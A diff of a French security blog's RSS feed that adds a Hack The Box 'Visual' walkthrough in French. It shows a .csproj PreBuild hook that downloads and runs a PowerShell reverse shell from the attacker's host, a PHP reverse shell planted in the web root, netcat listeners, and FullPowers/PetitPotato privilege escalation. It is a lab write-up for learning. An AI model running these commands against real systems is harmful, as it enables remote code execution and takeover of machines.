@@ -6,15 +6,258 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>fr</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Tue, 13 Feb 2024 14:31:59 -0600</lastBuildDate>
+        <lastBuildDate>Sat, 24 Feb 2024 19:37:32 -0600</lastBuildDate>
         <atom:link href="https://scorpiosec.com/fr/posts/index.xml" rel="self" type="application/rss+xml" />
         
         <item>
-            <title>OhSINT</title>
-            <link>https://scorpiosec.com/fr/posts/2024/02/ohsint/</link>
+            <title>HTB: Visual</title>
+            <link>https://scorpiosec.com/fr/posts/2024/02/htb-visual/</link>
+            <pubDate>Sat, 24 Feb 2024 19:37:32 -0600</pubDate>
+            
+            <guid>https://scorpiosec.com/fr/posts/2024/02/htb-visual/</guid>
+            <description>Platforme: Hack The Box Link: Visual Niveau: Moyen OS: Windows La cible est une machine Windows de difficulté moyenne avec une application web acceptant les URLs des répertoires Git soumis par les utilisateurs.
+Adresse IP cible - 10.10.11.234
+Mon adresse IP - 10.10.14.222
+Balayage (Scanning) sudo nmap -sC -sV -oA nmap/Visual 10.10.11.234 Je commence avec un scan nmap et j&amp;rsquo;obtiens quelques informations:
+Un serveur web Apache Une machine Windows Une application PHP Starting Nmap 7.</description>
+            <content type="html"><![CDATA[<ul>
+<li>Platforme: Hack The Box</li>
+<li>Link: <a href="https://app.hackthebox.com/machines/Visual" target="_blank" >Visual</a>
+
+</li>
+<li>Niveau: Moyen</li>
+<li>OS: Windows</li>
+</ul>
+<hr>
+<p>La cible est une machine Windows de difficulté moyenne avec une application web acceptant les URLs des répertoires Git soumis par les utilisateurs.</p>
+<p>Adresse IP cible - <code>10.10.11.234</code></p>
+<!-- raw HTML omitted -->
+<p>Mon adresse IP - <code>10.10.14.222</code></p>
+<h2 id="balayage-scanning">Balayage (Scanning)</h2>
+<pre tabindex="0"><code>sudo nmap -sC -sV -oA nmap/Visual 10.10.11.234
+</code></pre><p>Je commence avec un scan nmap et j&rsquo;obtiens quelques informations:</p>
+<ul>
+<li>Un serveur web Apache</li>
+<li>Une machine Windows</li>
+<li>Une application PHP</li>
+</ul>
+<pre tabindex="0"><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-20 19:13 MST
+Nmap scan report for 10.10.11.234
+Host is up (0.047s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
+|_http-title: Visual - Revolutionizing Visual Studio Builds
+|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.28 seconds
+</code></pre><h2 id="enumération">Enumération</h2>
+<p>Nous accédons à l&rsquo;application web en visitant <code>http://10.10.11.234</code>. L&rsquo;application semble être un service permettant à l&rsquo;utilisateur de soumettre le lien d&rsquo;un répertoire Git, qui compilera ensuite le projet .NET pour l&rsquo;utilisateur.</p>
+<p><img src="/images/HTB-Visual/Visual-webapp.png" alt="Visual Webapp"></p>
+<p>Je teste la fonctionnalité en envoyant un URL, via Python3.</p>
+<pre tabindex="0"><code>python3 -m http.server
+</code></pre><p>Je soumets mon lien <code>http://10.10.14.222:8000</code> (Remplacez <code>10.10.14.222</code> par votre adresse IP)</p>
+<p><img src="/images/HTB-Visual/link-submit-Visual-1.png" alt="Link-submit1"></p>
+<p>Je suis redirigé vers cette page, où l&rsquo;application tente de compiler mon projet.
+<img src="/images/HTB-Visual/Visual-build-attempt.png" alt="Build attempt"></p>
+<p>Comme il n&rsquo;y a pas de projet à cet URL, l&rsquo;opération échoue mais j&rsquo;obtiens quelques informations. Cette application recherche un fichier <code>.sln</code>.</p>
+<blockquote>
+<p>Un fichier .sln est un fichier de solution utilisé par Microsoft Visual Studio. Ce fichier sert de conteneur pour un ou plusieurs projets. Il permet d&rsquo;organiser et de gérer des projets au sein d&rsquo;un espace de travail unique. Le fichier .sln stocke des informations sur les projets qu&rsquo;il contient, notamment leurs dépendances, les configurations de construction et les références à des bibliothèques ou ressources externes.</p>
+</blockquote>
+<p><img src="/images/HTB-Visual/Visual-build-failure.png" alt="Build failure"></p>
+<p>Je peux voir les réponses sur mon serveur.</p>
+<p><img src="/images/HTB-Visual/python3server-GET-method-1.png" alt="Get method server"></p>
+<p>Je vois un code 404, aucun fichier n&rsquo;ayant été trouvé à mon URL et <code>GET /info/refs?service=git-upload-pack HTTP/1.1&quot; 404</code>. Il semble que l&rsquo;application utilise le service <code>git-upload-pack</code> qui fait partie du protocole Git utilisé pour des opérations telles que le clonage ou la récupération de modifications à partir d&rsquo;un répertoire. Pour en savoir plus, cliquez <a href="https://git-scm.com/docs/git-upload-pack" target="_blank" >ici</a>
+
+.</p>
+<p>On peut lire sur le site que notre lien doit mener à un projet .NET 6.0 avec un fichier <code>.sln</code>.</p>
+<p><img src="/images/HTB-Visual/Visual-dotnet-support.png" alt="Visual support"></p>
+<h2 id="foothold">Foothold</h2>
+<p>Je n&rsquo;ai jamais utilisé .NET, j&rsquo;ai donc demandé à ChatGPT de m&rsquo;aider à créer un projet pour cette technologie.</p>
+<pre tabindex="0"><code>dotnet new sln -n visual
+</code></pre><p>Lorsque vous exécutez la commande <code>dotnet new sln -n visual</code>, un nouveau fichier de solution nommé <code>visual.sln</code> est créé.
+<img src="/images/HTB-Visual/dotnet-new-sln.png" alt="Dotnet new sln"></p>
+<pre tabindex="0"><code>dotnet new console -n visual
+</code></pre><p>Cette commande crée un nouveau projet d&rsquo;application nommé <code>visual</code>. Ce projet contiendra les fichiers et les configurations nécessaires pour une application console de base écrite en C#.</p>
+<p><img src="/images/HTB-Visual/dotnet-new-console.png" alt="Dotnet new console"></p>
+<p>Ajoutons le fichier de projet <code>visual.csproj</code> situé dans le répertoire <code>visual</code> au fichier de la solution (<code>visual.sln</code>).</p>
+<pre tabindex="0"><code>dotnet sln add visual/visual.csproj
+</code></pre><p><img src="/images/HTB-Visual/dotnet-sln-add.png" alt="Dotnet sln add"></p>
+<blockquote>
+<p>Pour les projets .NET, un fichier <code>.csproj</code> est utilisé pour définir et configurer le projet. Il s&rsquo;agit d&rsquo;un fichier XML qui contient des métadonnées et des paramètres concernant le projet, tels que ses dépendances, ses paramètres de construction, le cadre cible, etc.</p>
+</blockquote>
+<p><code>git init</code> est utilisé pour initialiser un nouveau répertoire Git.</p>
+<pre tabindex="0"><code>git init
+</code></pre><p><img src="/images/HTB-Visual/visual-git-init.png" alt="Visual git init"></p>
+<p>Il nous faut trouver un moyen de servir notre répertoire Git à l&rsquo;application. J&rsquo;ai trouvé un excellent article à ce sujet ici, <a href="https://theartofmachinery.com/2016/07/02/git_over_http.html" target="_blank" >A Quick and Hacky Way to Serve a Git Repo over HTTP</a>
+
+.</p>
+<p>Exécutons maintenant les commandes suivantes</p>
+<pre tabindex="0"><code>git add .
+git commit -m &#34;Test&#34;
+cd .git
+git --bare update-server-info
+cd ..
+</code></pre><blockquote>
+<p>Nous devrons les exécuter à chaque fois que nous apporterons des modifications à nos fichiers. Lorsque vous exécutez <code>git --bare update-server-info</code>, Git met à jour les fichiers auxiliaires nécessaires pour servir le répertoire via le réseau.</p>
+</blockquote>
+<p>Relancez votre serveur python avec <code>python3 -m http.server</code> et soumettez votre URL maintenant que nous avons les bons fichiers.</p>
+<pre tabindex="0"><code>http://10.10.14.222:8000/.git
+</code></pre><p><img src="/images/HTB-Visual/url-submission-visual1.png" alt="Visual link submit2"></p>
+<!-- raw HTML omitted -->
+<p>Le processus de compilation est cette fois-ci un succès.</p>
+<p><img src="/images/HTB-Visual/visual-building-successful.png" alt="Visual successful build"></p>
+<p>De retour sur notre serveur, nous obtenons des requêtes GET valides.</p>
+<p><img src="/images/HTB-Visual/server-good-requests.png" alt="Server good requests"></p>
+<p>Je peux voir que l&rsquo;application compile les fichiers dans le répertoire git. Nous devons trouver un moyen d&rsquo;exploiter ce processus. En faisant des recherches, je trouve cette <a href="https://learn.microsoft.com/en-us/visualstudio/ide/how-to-specify-build-events-csharp?view=vs-2022" target="_blank" >page de Microsoft</a>
+
+ qui explique qu&rsquo;un &ldquo;pre-build event&rdquo; fait référence à un script ou à une commande qui est exécuté avant que le processus de compilation pour le projet ne commence.</p>
+<p>Nous pouvons utiliser un événement <code>PreBuild</code> dans le fichier <code>.csproj</code> pour exécuter des commandes. Essayons d&rsquo;ajouter un shell inversé (reverse shell).</p>
+<ul>
+<li>Ci-dessous, mon fichier <code>.csproj</code> modifié</li>
+</ul>
+<pre tabindex="0"><code>&lt;Project Sdk=&#34;Microsoft.NET.Sdk&#34;&gt;
+
+  &lt;PropertyGroup&gt;
+    &lt;OutputType&gt;Exe&lt;/OutputType&gt;
+    &lt;TargetFramework&gt;net6.0&lt;/TargetFramework&gt;
+    &lt;ImplicitUsings&gt;enable&lt;/ImplicitUsings&gt;
+    &lt;Nullable&gt;enable&lt;/Nullable&gt;
+  &lt;/PropertyGroup&gt;
+
+&lt;Target Name=&#34;PreBuild&#34; BeforeTargets=&#34;PreBuildEvent&#34;&gt;
+    &lt;Exec Command=&#34;powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.222:8000/revshell.ps1&#39;)&#34; /&gt;
+  &lt;/Target&gt;
+
+&lt;/Project&gt;
+</code></pre><ul>
+<li>Créons un script PowerShell <code>revshell.ps1</code> pour obtenir un shell distant. J&rsquo;ai utilisé ce <a href="https://github.com/K-Scorpio/scripts-collection/blob/main/revshell.ps1" target="_blank" >nishang shell</a>
+
+ pour le reverse shell. J&rsquo;ai modifié ce <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank" >shell</a>
+
+, en changeant le nom de la fonction et en ajoutant le &ldquo;reverse switch&rdquo; à la fin.</li>
+</ul>
+<p>Je mets en place un listener netcat avec</p>
+<pre tabindex="0"><code>nc -nvlp 9001
+</code></pre><p>Nous utilisons encore ces commandes git</p>
+<pre tabindex="0"><code>git add .
+git commit -m &#34;Add as a test&#34;
+cd .git
+git --bare update-server-info
+cd ..
+</code></pre><p>Si vous avez stoppé votre serveur Python, redémarrez-le (et laissez-le tourner) et re-soumettez votre lien.</p>
+<p>Le listener devrait capturer un shell une fois la compilation terminée, nous sommes dans le système!</p>
+<p><img src="/images/HTB-Visual/nc-listener-shell.png" alt="nc listener, reverse shell"></p>
+<p>Executer <code>whoami</code> nous permet de constater que nous sommes l&rsquo;utilisateur <code>enox</code>.</p>
+<p><img src="/images/HTB-Visual/target-whoami.png" alt="whoami command on target"></p>
+<p>Nous pouvons vérifier nos privilèges avec <code>whoami /priv</code>.
+<img src="/images/HTB-Visual/target-priv.png" alt="privilege on target machine"></p>
+<p>Je vais dans le répertoire principal de l&rsquo;utilisateur avec <code>cd \Users\enox</code> et j&rsquo;utilise <code>ls</code> pour voir les différents sous-répertoires.</p>
+<p><img src="/images/HTB-Visual/target-directories.png" alt="directories listing on target"></p>
+<p>Je consulte le contenu du répertoire <code>Desktop</code> avec <code>dir Desktop</code> et je vois le drapeau <code>user.txt</code>. Utilisez <code>cat user.txt</code> pour examiner son contenu.</p>
+<p><img src="/images/HTB-Visual/Visual-user-flag.png" alt="User flag"></p>
+<h2 id="mouvement-latéral">Mouvement Latéral</h2>
+<p>Pour trouver les chemins d&rsquo;escalade de privilèges, utilisons <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20240223-ab2bb023" target="_blank" >winPEAS</a>
+
+. Téléchargez WinPEASany.exe et stockez-le dans le dossier que vous utilisez pour votre serveur python.</p>
+<p><img src="/images/HTB-Visual/winPEAS-location.png" alt="winPEAS location"></p>
+<p>Transférer le fichier sur le système cible avec <code>wget</code>.</p>
+<pre tabindex="0"><code>wget http://10.10.14.222:8000/winPEASany.exe -o wpany.exe
+</code></pre><blockquote>
+<p>Utilisez votre adresse IP et remplacez le port par celui que vous utilisez pour votre serveur.</p>
+</blockquote>
+<p>Vérifiez que le fichier se trouve sur la cible.</p>
+<p><img src="/images/HTB-Visual/winPEAS-on-target.png" alt="winPEAS location on target"></p>
+<p>Vous pouvez vérifier les options de winPEAS avec <code>./wpany.exe -h</code>.</p>
+<p><img src="/images/HTB-Visual/winpeas-options.png" alt="winPEAS options"></p>
+<p>Exécutez winPEAS avec les options que vous souhaitez. Parce que je veux une énumération assez complète, j&rsquo;utilise la commande suivante</p>
+<pre tabindex="0"><code>./wpany.exe domain systeminfo userinfo processinfo servicesinfo applicationsinfo networkinfo windowscreds browserinfo filesinfo eventsinfo quiet
+</code></pre><p>Il semble que nous possédons les permissions pour accéder au dossier contenant le service Apache HTTP Server.</p>
+<p><img src="/images/HTB-Visual/ApacheServerHTTP.png" alt="Apache Server HTTP"></p>
+<p>En parcourant les résultats, on peut noter que nous avons un accès complet au répertoire xampp (rappelez-vous qu&rsquo;il s&rsquo;agit d&rsquo;une application PHP), le même dossier que celui dans lequel Apache est stocké.</p>
+<p><img src="/images/HTB-Visual/xampp-permissions.png" alt="xampp directory"></p>
+<p>Nous pouvons essayer d&rsquo;en savoir plus sur <code>ApacheHTTPServer</code> avec</p>
+<pre tabindex="0"><code>Get-CIMInstance -Class Win32_Service -Filter &#34;Name=&#39;ApacheHTTPServer&#39;&#34; | Select-Object *
+</code></pre><p>Voici le résultat que nous obtenons, il semble qu&rsquo;il s&rsquo;exécute sous <code>NT AUTHORITY\NLocal Service</code>.</p>
+<p><img src="/images/HTB-Visual/AppacheHTTPServer-info-1.png" alt="Apache HTTP Server service info"></p>
+<blockquote>
+<p>&ldquo;Sur Windows 10, le service UPnP Device Host est configuré pour s&rsquo;exécuter sans privilèges d&rsquo;usurpation d&rsquo;identité en tant qu&rsquo;utilisateur NT AUTHORITY\LOCAL SERVICE&hellip;&rdquo;. En résumé, nous pouvons réaliser une escalade des privilèges via ce compte. Pour en savoir plus, cliquez <a href="https://itm4n.github.io/localservice-privileges/" target="_blank" >ici</a>
+
+.</p>
+</blockquote>
+<p>Le service s&rsquo;exécute sous <code>NT AUTHORITY\NLocal Service</code>, nous devons donc accéder à ce compte. Puisque nous avons accès au répertoire xampp, nous pouvons y installer un reverse shell et y accéder via le navigateur web. Je vais dans ce répertoire et je liste son contenu.</p>
+<blockquote>
+<p>Pour les applications PHP, le dossier XAMPP sert de répertoire racine pour l&rsquo;hébergement des fichiers web (tels que HTML, PHP, CSS, JavaScript, images, etc.) et la gestion des paramètres de configuration du serveur.</p>
+</blockquote>
+<pre tabindex="0"><code>cd C:\Xampp\
+ls
+</code></pre><p><img src="/images/HTB-Visual/xampp-content-1.png" alt="xampp directory content"></p>
+<p>Remarquez le dossier <code>htdocs</code>.</p>
+<blockquote>
+<p>Avec XAMPP, le dossier <code>htdocs</code> est la racine du serveur web par défaut. Cela signifie que tous les fichiers placés dans le dossier <code>htdocs</code> seront accessibles via un navigateur web lorsque le serveur XAMPP est en cours d&rsquo;exécution.</p>
+</blockquote>
+<p>Les fichiers de l&rsquo;application sont présents, comme vous pouvez le voir. Nous pouvons placer un reverse shell PHP dans le dossier <code>htdocs</code>.</p>
+<p><img src="/images/HTB-Visual/xampp-htdocs.png" alt="xampp htdocs directory"></p>
+<p>J&rsquo;ai utilisé ce <a href="https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php" target="_blank" >reverse shell PHP</a>
+
+.</p>
+<p>Je lance ensuite <code>wget http://10.10.14.222:8000/revshell.php -o rev.php</code> pour le transférer sur le serveur cible.</p>
+<p><img src="/images/HTB-Visual/php-reverse-shell-1.png" alt="PHP reverse shell on the target"></p>
+<p>Mettons en place un listener netcat avec</p>
+<pre tabindex="0"><code>nc -nvlp 8010
+</code></pre><blockquote>
+<p>Utilisez le numéro de port que vous avez spécifié dans le reverse shell PHP.</p>
+</blockquote>
+<p>Retournez à votre navigateur et allez à <code>http://&lt;adresse IP cible&gt;/rev.php</code>, revenez à votre listener et vous devriez avoir un shell avec l&rsquo;utilisateur <code>nt authority\local service</code>.</p>
+<p><img src="/images/HTB-Visual/nt-authority-local-service.png" alt="nt authority user shell on the target"></p>
+<p>Vérifiez vos privilèges et vous remarquez qu&rsquo;il vous manque le privilège <code>ImpersonatePrivilege</code> nécessaire pour obtenir les privilèges administratifs.</p>
+<p>Exécutons <code>whoami /priv</code>.</p>
+<p><img src="/images/HTB-Visual/nt-authority-priv.png" alt="nt authority user privileges"></p>
+<h2 id="escalade-des-privilèges">Escalade des privilèges</h2>
+<p>Cet <a href="https://itm4n.github.io/localservice-privileges/" target="_blank" >article</a>
+
+ vous donne le lien d&rsquo;un outil qui permet d&rsquo;obtenir plus de privilèges. L&rsquo;outil s&rsquo;appelle <a href="https://github.com/itm4n/FullPowers" target="_blank" >FullPowers</a>
+
+. Téléchargez-le sur la machine cible (Assurez-vous d&rsquo;utiliser le reverse shell avec <code>nt authority\local service</code>).</p>
+<blockquote>
+<p>Ce fichier ne sera pas exécuté via le navigateur, donc nous retournons dans le répertoire <code>xampp</code> avec (<code>cd ..</code>) avant de télécharger notre fichier.</p>
+</blockquote>
+<pre tabindex="0"><code>wget http://10.10.14.222:8000/FullPowers.exe -o fp.exe
+</code></pre><p>Une erreur se produit parce que nous disposons actuellement d&rsquo;un shell cmd et non d&rsquo;un shell PowerShell.</p>
+<p><img src="/images/HTB-Visual/shell-error-1.png" alt="nt authority user shell error"></p>
+<p>Il suffit d&rsquo;utiliser <code>powershell</code> et de réexécuter la commande <code>wget</code>.</p>
+<p><img src="/images/HTB-Visual/powershell-fullpowers-dl.png" alt="nt authority FullPowers dlownload"></p>
+<p>Maintenant, nous exécutons <code>fp.exe</code> et nous obtenons de nouveaux privilèges! Remarquez que nous avons été rétrogradés à un shell cmd et que nous avons été forcés hors du dossier <code>xampp</code>, nous devons donc exécuter <code>powershell</code> à nouveau et <code>cd C:\xampp</code>.</p>
+<p><img src="/images/HTB-Visual/nt-authority-new-priv.png" alt="nt authority user new privileges"></p>
+<p>Nous pouvons maintenant utiliser <a href="https://github.com/wh0amitz/PetitPotato" target="_blank" >PetitPotato</a>
+
+ pour réaliser une escalade de privilèges en abusant de <code>ImpersonatePrivilege</code>.</p>
+<p>Nous le transmettons à la cible en exécutant</p>
+<pre tabindex="0"><code>wget http://10.10.14.222:8000/PetitPotato.exe -o pp.exe
+</code></pre><p>Nous obtenons une erreur</p>
+<pre tabindex="0"><code>wget : Win32 internal error &#34;Access is denied&#34; 0x5 occurred while reading the console output buffer. Contact Microsoft 
+</code></pre><p>Il semble que cette erreur soit causée par la barre de progression affichée sur le terminal. Elle peut être résolue en exécutant <code>$ProgressPreference = &quot;SilentlyContinue&quot;</code> avant la commande <code>wget</code>.</p>
+<p>Nous pouvons maintenant utiliser notre fichier en exécutant</p>
+<pre tabindex="0"><code>./pp.exe 3 cmd
+</code></pre><p><img src="/images/HTB-Visual/PetitPotato-exploit.png" alt="PetitPotato exploit"></p>
+<p>Nous avons maintenant des privilèges d&rsquo;administrateur.</p>
+<pre tabindex="0"><code>cd C:\Users\Administrator\Desktop
+</code></pre><p>Ensuite, listons le contenu du répertoire, nous avons encore été rétrogradés à un shell cmd, nous devons donc utiliser <code>dir</code>.</p>
+<p><img src="/images/HTB-Visual/root-flag.png" alt="root flag"></p>
+<p>Nous trouvons le fichier <code>root.txt</code>! Utilisez <code>type root.txt</code> pour voir son contenu.</p>
+<p>C&rsquo;est tout pour mon premier writeup sur Hack The Box! J&rsquo;espère qu&rsquo;il vous a été utile. Si vous avez des questions, laissez un commentaire ou contactez-moi sur X <a href="https://twitter.com/_KScorpio" target="_blank" >@_KScorpio</a>
+
+.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>THM: OhSINT</title>
+            <link>https://scorpiosec.com/fr/posts/2024/02/thm-ohsint/</link>
             <pubDate>Tue, 13 Feb 2024 14:31:59 -0600</pubDate>
             
-            <guid>https://scorpiosec.com/fr/posts/2024/02/ohsint/</guid>
+            <guid>https://scorpiosec.com/fr/posts/2024/02/thm-ohsint/</guid>
             <description>Platforme: TryHackMe Lien: OhSINT Niveau: Easy Type: OSINT Il s&amp;rsquo;agit d&amp;rsquo;un défi OSINT, c&amp;rsquo;est-à-dire Open-Source Intelligence. L&amp;rsquo;OSINT est essentiellement de la collecte et de l&amp;rsquo;analyse d&amp;rsquo;informations accessibles au public afin d&amp;rsquo;obtenir des renseignements. C&amp;rsquo;est un peu comme reconstituer un puzzle en utilisant les pièces que vous trouvez sur Internet, dans les bibliothèques ou dans tout autre endroit où l&amp;rsquo;information est librement accessible.
 Après avoir téléchargé les fichiers de tâches à l&amp;rsquo;aide du bouton Download Task Files, vous obtenez une seule image nommée WindowsXP.</description>
             <content type="html"><![CDATA[<ul>
